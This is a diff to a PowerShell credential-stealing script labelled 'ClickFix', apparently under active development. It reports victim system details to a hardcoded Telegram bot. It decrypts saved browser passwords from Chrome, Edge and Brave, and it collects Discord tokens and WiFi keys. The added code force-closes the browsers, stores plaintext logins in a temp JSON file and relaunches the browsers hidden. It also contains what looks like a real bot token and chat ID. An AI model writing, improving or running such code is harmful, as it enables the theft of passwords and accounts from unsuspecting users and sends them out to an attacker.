@@ -2,22 +2,21 @@ $tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
 $tgChat = "-1003960241194"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $tgBase = "https://api.telegram.org/bot$tgToken"
-$lt = [char]0x3C; $gt = [char]0x3E
-function e($c) { [char]::ConvertFromUtf32($c) }
+$b = [char]0x3C; $B = [char]0x3E
 
 function ts($m) {
-  $t = "$lt" + "b$gt" + "$m" + "$lt" + "/b$gt"
-  $b = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
+  $t = "${b}b${B}${m}${b}/b${B}"
+  $j = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
   for ($i = 0; $i -lt 3; $i++) {
-    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $b -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
+    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $j -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
     catch { if ($i -ge 2) { break }; Start-Sleep -Seconds 2 }
   }
   Start-Sleep -Milliseconds 500
 }
 
-$R = e 0x1F680; $PC = e 0x1F4BB; $LK = e 0x1F510; $KY = e 0x1F511; $GL = e 0x1F310
-$RB = e 0x1F3B2; $GM = e 0x1F3AE; $WF = e 0x1F4E1; $CK = e 0x2705; $XX = e 0x274C
-$WA = e 0x26A0; $W2 = e 0xFE0F
+$R = "[+]"; $PC = "[i]"; $LK = "[k]"; $KY = "[k]"; $GL = "[w]"
+$RB = "[g]"; $GM = "[d]"; $WF = "[n]"; $CK = "[v]"; $XX = "[x]"
+$WA = "[!]"
 
 ts "$R ClickFix started"
 
@@ -28,7 +27,7 @@ try {
   $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
   $user = $env:USERNAME; $comp = $env:COMPUTERNAME; $dom = $env:USERDOMAIN
   ts "$PC System:`nIP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
-} catch { ts "$WA$W2 System info error: $_" }
+} catch { ts "$WA System info error: $_" }
 
 try {
   Add-Type @"
@@ -74,7 +73,7 @@ Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp); BDesKey(hk); BClose(ha,0);
 if(ret!=0)return null; Array.Resize(ref op,(int)rl); return op; } }
 "@
   ts "$LK Crypto module:`n$CK Compiled OK"
-} catch { ts "$WA$W2 Crypto module failed: $_"; exit }
+} catch { ts "$WA Crypto module failed: $_"; exit }
 
 $chromeKey = $null
 try {
@@ -90,7 +89,7 @@ try {
       else { ts "$KY Chrome master key:`n$XX Decryption failed" }
     }
   } else { ts "$KY Chrome master key:`n$XX Local State not found" }
-} catch { ts "$WA$W2 Chrome key error: $_" }
+} catch { ts "$WA Chrome key error: $_" }
 
 $pwCount = 0; $ckCount = 0; $histCount = 0; $robCookie = $null
 $browserReports = @()
@@ -100,6 +99,14 @@ $browsers = @(
   @("Edge", "$env:LOCALAPPDATA\Microsoft\Edge\User Data"),
   @("Brave", "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
 )
+
+$allPasswords = @()
+$browserNames = @("chrome", "msedge", "brave")
+foreach ($n in $browserNames) {
+  Get-Process -Name $n -ErrorAction SilentlyContinue | Stop-Process -Force
+}
+Start-Sleep -Seconds 2
+ts "$R Browsers closed for DB access"
 
 foreach ($browser in $browsers) {
   $bName = $browser[0]; $basePath = $browser[1]
@@ -136,6 +143,7 @@ foreach ($browser in $browsers) {
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             while ([N]::sqlite3_step($stmt) -eq 100) {
+              $urlPtr = [N]::sqlite3_column_text($stmt, 0); $usrPtr = [N]::sqlite3_column_text($stmt, 1)
               $encLen = [N]::sqlite3_column_bytes($stmt, 2); $encPtr = [N]::sqlite3_column_blob($stmt, 2)
               if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
                 $enc = New-Object byte[] $encLen; [Runtime.InteropServices.Marshal]::Copy($encPtr, $enc, 0, $encLen)
@@ -143,7 +151,13 @@ foreach ($browser in $browsers) {
                 if ($ctLen -gt 0) {
                   $ct = $enc[15..(14 + $ctLen)]; $tag = $enc[(15 + $ctLen)..($encLen - 1)]
                   $dec = [N]::AG($chromeKey, $nonce, $ct, $tag)
-                  if ($dec -ne $null) { $bpw++; $pwCount++ }
+                  if ($dec -ne $null) {
+                    $bpw++; $pwCount++
+                    $u = if ($usrPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($usrPtr) } else { "" }
+                    $l = if ($urlPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($urlPtr) } else { "" }
+                    $p = [System.Text.Encoding]::UTF8.GetString($dec)
+                    $allPasswords += @{url=$l;username=$u;password=$p;browser=$bName}
+                  }
                 }
               }
             }
@@ -228,7 +242,7 @@ try {
     }
   }
   if ($tokens.Count -gt 0) { ts "$GM Discord tokens ($($tokens.Count)):`n$($tokens -join "`n")" } else { ts "$GM Discord tokens:`n$XX Not found" }
-} catch { ts "$WA$W2 Discord scan error: $_" }
+} catch { ts "$WA Discord scan error: $_" }
 
 try {
   $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
@@ -239,6 +253,18 @@ try {
     $wifiList += "${ssid}: $pw"
   }
   if ($wifiList.Count -gt 0) { ts "$WF WiFi ($($wifiList.Count) networks):`n$($wifiList -join ' | ')" } else { ts "$WF WiFi:`n$XX No profiles found" }
-} catch { ts "$WA$W2 WiFi error: $_" }
+} catch { ts "$WA WiFi error: $_" }
+
+if ($allPasswords.Count -gt 0) {
+  try {
+    $jsonPath = "$env:TEMP\passwords.json"
+    $allPasswords | ConvertTo-Json -Depth 3 | Set-Content $jsonPath -Encoding UTF8
+    ts "$CK Passwords saved: $jsonPath ($($allPasswords.Count) entries)"
+  } catch { ts "$WA Failed to save passwords: $_" }
+}
+
+foreach ($n in @("chrome", "msedge", "brave")) {
+  try { Start-Process $n -WindowStyle Hidden -ErrorAction Stop } catch {}
+}
 
 ts "$CK All phases complete"
